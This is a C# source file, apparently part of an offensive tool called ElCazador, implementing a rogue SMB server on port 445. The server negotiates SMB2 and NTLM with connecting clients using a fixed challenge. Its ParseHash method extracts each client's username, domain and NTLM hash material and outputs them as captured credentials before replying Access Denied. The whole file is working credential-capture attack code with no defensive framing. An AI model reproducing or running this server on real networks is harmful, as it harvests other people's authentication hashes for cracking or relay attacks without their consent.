using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ElCazador.Worker.Interfaces;
using ElCazador.Worker.Models;
using ElCazador.Worker.Modules.Servers.Models;
using ElCazador.Worker.Utils;

namespace ElCazador.Worker.Modules.Servers
{
    internal class SMBServer : AbstractModule, IModule
    {
        private static ManualResetEvent mre = new ManualResetEvent(false);
        private Socket Socket { get; set; }
        public bool IsEnabled => true;

        public SMBServer(IWorkerController controller) : base(controller, "SMBServer") { }


        public async Task Run()
        {
            await StartSocket();
        }

        private async Task StartSocket()
        {
            try
            {
                // Data buffer for incoming data.  
                byte[] bytes = new Byte[1024];
                IPEndPoint localEndPoint = new IPEndPoint(Controller.WorkerSettings.IP, 445);

                // Create a TCP/IP socket.  
                Socket listener = new Socket(localEndPoint.Address.AddressFamily,
                    SocketType.Stream, ProtocolType.Tcp);

                // Bind the socket to the local endpoint and listen for incoming connections.  
                listener.Bind(localEndPoint);
                listener.Listen(100);

                while (true)
                {
                    // Set the event to nonsignaled state.  
                    mre.Reset();

                    // Start an asynchronous socket to listen for connections.  
                    listener.BeginAccept(
                        new AsyncCallback(async (ar) => await AcceptCallback(ar)),
                        listener);

                    // Wait until a connection is made before continuing.  
                    mre.WaitOne();
                }

            }
            catch (Exception e)
            {
                await Controller.Log(Name, e.ToString());
            }
        }

        private async Task AcceptCallback(IAsyncResult asyncResult)
        {
            try
            {
                // Signal the main thread to continue.  
                mre.Set();

                // Get the socket that handles the client request.  
                Socket listener = (Socket)asyncResult.AsyncState;
                Socket handler = listener.EndAccept(asyncResult);

                // Create the state object.  
                SMBPacket state = new SMBPacket();
                state.Socket = handler;
                handler.BeginReceive(state.Buffer, 0, SMBPacket.BUFFER_SIZE, 0,
                    new AsyncCallback(async (ar) => await ReadCallback(ar)), state);

                await Task.CompletedTask;
            }
            catch (Exception e)
            {
                await Controller.Log(Name, e.ToString());
            }
        }

        private async Task ReadCallback(IAsyncResult asyncResult)
        {
            try
            {
                // Retrieve the state object and the handler socket  
                // from the asynchronous state object.  
                SMBPacket state = (SMBPacket)asyncResult.AsyncState;
                Socket handler = state.Socket;

                // Read data from the client socket.   
                int bytesRead = 1;//handler.EndReceive(ar);

                if (bytesRead > 0)
                {
                    if (state.Buffer[8].Equals(SMB2Commands.SMB1NegotiateToSMB2))
                    {
                        await NegotiateSMB1ToSMB2Response(state);
                    }
                    else if (state.Command.SequenceEqual(SMB2Commands.Request))
                    {
                        await NegotiateResponse(state);
                    }
                    else if (state.Command.SequenceEqual(SMB2Commands.NegotiateNTLM) && state.MessageID.SequenceEqual(new byte[] { 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
                    {
                        await NegotiateNTLMResponse(state);
                    }
                    else if (state.Command.SequenceEqual(SMB2Commands.NegotiateNTLM) && state.MessageID.SequenceEqual(new byte[] { 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
                    {
                        await ParseHash(state);
                        await SendAccessDenied(state);

                        if (handler.Connected)
                        {
                            handler.EndReceive(asyncResult);
                            handler.Shutdown(SocketShutdown.Both);
                        }

                        return;
                    }
                    try
                    {

                        handler.BeginReceive(state.Buffer, 0, SMBPacket.BUFFER_SIZE, 0,
                            new AsyncCallback(async (ar) => await ReadCallback(ar)), state);
                    }
                    catch (ObjectDisposedException e)
                    {

                    }
                }
            }
            catch (SocketException e)
            {
                await Controller.Log(Name, e.Message);
            }
        }

        private async Task ParseHash(SMBPacket packet)
        {
            var auth = packet.Buffer.Skip(113).ToArray();

            short lmHashLen = BitConverter.ToInt16(auth, 12);
            short lmHashOffset = BitConverter.ToInt16(auth, 16);
            var lmHash = BitConverter.ToString(auth.Skip(lmHashOffset).Take(lmHashLen).ToArray()).Replace("-", "");

            var ntHashLen = BitConverter.ToInt16(auth, 22);
            short ntHashOffset = BitConverter.ToInt16(auth, 24); ;
            var ntHash = BitConverter.ToString(auth.Skip(ntHashOffset).Take(ntHashLen).ToArray()).Replace("-", "");

            short domainLen = BitConverter.ToInt16(auth, 30);
            short domainOffset = BitConverter.ToInt16(auth, 32);
            string domain = Encoding.Unicode.GetString(auth.Skip(domainOffset).Take(domainLen).ToArray());

            short userLen = BitConverter.ToInt16(auth, 38);
            short userOffset = BitConverter.ToInt16(auth, 40);
            string user = Encoding.Unicode.GetString(auth.Skip(userOffset).Take(userLen).ToArray());

            await Controller.Output(Name, new User
            {
                IPAddress = (packet.Socket.RemoteEndPoint as IPEndPoint).Address,
                Username = user,
                Domain = domain,
                Challenge = "6769766563707223",
                NetLMHash = String.Concat(ntHash.Take(32)),
                NetNTHash = string.Concat(ntHash.Skip(32))
            });
        }


        private async Task NegotiateSMB1ToSMB2Response(SMBPacket packet)
        {
            try
            {
                var header = new SMB2Header(new byte[] { 0x00, 0x00 });

                var data = new SMB2NegotiateResponse(header.Build()).Build();

                await Send(packet.Socket, data);
            }
            catch (Exception e)
            {
                await Controller.Log(Name, e.ToString());
            }
        }

        private async Task NegotiateResponse(SMBPacket packet)
        {
            try
            {


                var header = new SMB2Header(
                    new byte[] { 0x00, 0x00 },
                    packet.MessageID,
                    packet.CreditCharge,
                    packet.Credits,
                    packet.ProcessID
                    );

                var data = new SMB2NegotiateResponse(
                    header.Build(),
                    new byte[] { 0x10, 0x02 }).Build();

                await Send(packet.Socket, data);
            }
            catch (Exception e)
            {
                await Controller.Log(Name, e.ToString());
            }
        }

        // head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), SessionID=GrabSessionID(data),NTStatus="\x16\x00\x00\xc0")
        private async Task NegotiateNTLMResponse(SMBPacket packet)
        {
            try
            {
                var header = new SMB2Header(
                    new byte[] { 0x01, 0x00 },
                    packet.MessageID,
                    packet.CreditCharge,
                    packet.Credits,
                    new byte[] { 0xff, 0xfe, 0x00, 0x00 },
                    packet.SessionID,
                    new byte[] { 0x16, 0x00, 0x00, 0xc0 }
                );

                var data = new SMB2NTLMNegotiate(header.Build()).Build();

                await Send(packet.Socket, data);
            }
            catch (Exception e)
            {
                await Controller.Log(Name, e.ToString());
            }
        }

        private async Task SendAccessDenied(SMBPacket packet)
        {
            try
            {
                var header = new SMB2Header(
                    new byte[] { 0x01, 0x00 },
                    packet.MessageID,
                    packet.CreditCharge,
                    packet.Credits,
                    new byte[] { 0xff, 0xfe, 0x00, 0x00 },
                    packet.SessionID,
                    new byte[] { 0x22, 0x00, 0x00, 0xc0 }
                );

                var data = new SMB2AccessDenied(header.Build()).Build();

                await Send(packet.Socket, data);
            }
            catch (Exception e)
            {
                await Controller.Log(Name, e.ToString());
            }
        }

        private async Task Send(Socket handler, byte[] data)
        {
            try
            {
                //TODO: At some point in life figure out why it is trying to send another packet here after the last one.

                // TODO: THIS IS SHIT! Do something elsero pleaso
                data = ByteUtils.IntToBigEndian(data.Length).Concat(data).ToArray();

                // Begin sending the data to the remote device.  

                handler.BeginSend(data, 0, data.Length, 0,
                    new AsyncCallback(async (ar) => await SendCallback(ar)), handler);
            }
            catch (SocketException e)
            {
                if (e.ErrorCode == 32)
                {
                    if (handler.Connected)
                    {
                        handler.Shutdown(SocketShutdown.Both);
                    }
                }
            }

            await Task.CompletedTask;
        }

        private async Task SendCallback(IAsyncResult ar)
        {
            try
            {
                // Retrieve the socket from the state object.  
                Socket handler = (Socket)ar.AsyncState;

                // Complete sending the data to the remote device.  
                int bytesSent = handler.EndSend(ar);
            }
            catch (Exception e)
            {
                await Controller.Log(Name, e.ToString());
            }
        }
    }
}